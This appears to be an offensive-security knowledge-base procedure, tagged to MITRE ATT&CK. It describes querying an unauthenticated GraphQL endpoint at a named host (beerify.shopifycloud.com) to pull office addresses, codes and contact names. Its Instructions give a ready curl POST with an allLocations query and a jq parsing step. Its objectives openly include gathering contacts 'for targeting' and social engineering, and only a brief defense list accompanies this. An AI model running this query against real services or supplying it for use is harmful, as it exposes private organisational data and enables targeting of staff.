---
tags:
  - graphql
  - discovery
  - information-disclosure
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/graphql-query-locations]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 8add3a6a-1655-4652-b770-5ff7ab52e470
created_at: '2025-12-14T17:25:59.618Z'
updated_at: '2025-12-14T17:25:59.618Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Query GraphQL for Office Locations

## Summary

This procedure sends a GraphQL query to an unauthenticated endpoint to retrieve internal office details, including addresses, codes, and contacts, exploiting lack of access controls.

## Description

Targeting endpoints like beerify.shopifycloud.com/graphql, this queries the allLocations object post-introspection. It assumes the endpoint is identified and requires proper JSON headers. Outcomes include disclosure of sensitive location data for social engineering. No auth needed, making it high-risk for internal info leaks.

## Requirements

1. Identified GraphQL endpoint
2. Burp Suite or curl for POST requests
3. Content-Type: application/json header
4. Location schema from introspection

## Defense

Defensive measures and detection strategies:

- Enforce auth on GraphQL queries
- Disable introspection in production
- Log and alert on location queries
- Use schema stitching with access controls

## Objectives

1. Retrieve office addresses and codes
2. Gather contact names for targeting
3. Enable follow-on queries

## Instructions

### Step 1: Send Location Query

**Context**: Use the allLocations query to fetch data via POST.

**Command** ([[commands/graphql-query-locations]]):
```bash
curl -X POST https://beerify.shopifycloud.com/graphql \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0" \
  -d '{"query": "query allLocations{allLocations{address, code, contact}}"}'
```

> Sends query with standard headers. Expected output: JSON array of locations like Ottawa office details.

### Step 2: Validate Response

**Context**: Check for successful data retrieval without errors.

**Command** (Parse with jq):
```bash
curl ... | jq '.data.allLocations[] | {address, code, contact}'
```

> Extracts key fields. Expected output: Structured location info.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-query-locations]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- graphql
- discovery
- information-disclosure
